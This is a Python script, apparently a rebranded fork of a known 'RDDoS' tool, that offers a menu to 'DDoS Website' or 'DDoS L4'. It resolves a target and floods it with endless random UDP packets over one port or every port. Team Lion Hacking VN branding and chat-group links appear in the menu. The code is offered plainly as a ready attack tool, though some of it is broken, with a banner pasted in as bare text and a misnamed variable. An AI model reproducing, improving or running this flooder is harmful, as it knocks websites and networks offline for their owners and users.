"""
Copyright (c) 2020-2021 Vladimir Rogozin (vladimir20040609@gmail.com)

Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
or copy at http://opensource.org/licenses/MIT)
"""

# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "1.2"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# RDDoS_Tool
while True:
    # UI.
╔╗             ╔═══╗      ╔╗
║║             ║╔═╗║      ║║
║║   ╔╗╔══╗╔═╗ ║╚═╝║╔══╗╔═╝║
║║ ╔╗╠╣║╔╗║║╔╗╗║╔╗╔╝║╔╗║║╔╗║
║╚═╝║║║║╚╝║║║║║║║║╚╗║║═╣║╚╝║
╚═══╝╚╝╚══╝╚╝╚╝╚╝╚═╝╚══╝╚══╝
                            Version 2.2 
                            

    print("                        Copyright\033[91mTeamLion\033[0m")
    print("       Discord : https://discord.gg/dXzZu7Gu")
    print('                  Zalo Box : https://zalo.me/g/wytmom367')
    print("\033[92;1m")
    print("1. DDoS Website\n2. DDoS L4\n3. Đội Ngũ Sản Xuất\n4. Exit")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Address: "))
        break

    elif opt == '3':
        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
        print("\033[101mOpen.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
        print("\033[101mSecure.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
        print("LionRed Cảm Ơn Bạn Đã Sử Dụng            \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
        print("Sever Discord : https://discord.gg/dXzZu7Gu       \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
        print("Zalo Sever : https://zalo.me/g/wytmom367                                 \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
        print("                                                         \033[92m'-._____.-'\033[0m")
        print("Tham Gia Sever Của Chúng Tôi Chúng Tôi Cảm Ơn Bạn")
        print("Đội Ngũ Edit Tools : Team Lion Hacing VN         Bạn Là Thành Viên Thứ : ???")
        print("Team Lion Hacking VN Thanks")
        print("\nThanks ! ")
        
        goon = input("\n\n\n\n\n\n\nBấm Enter Để Quay Lại")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
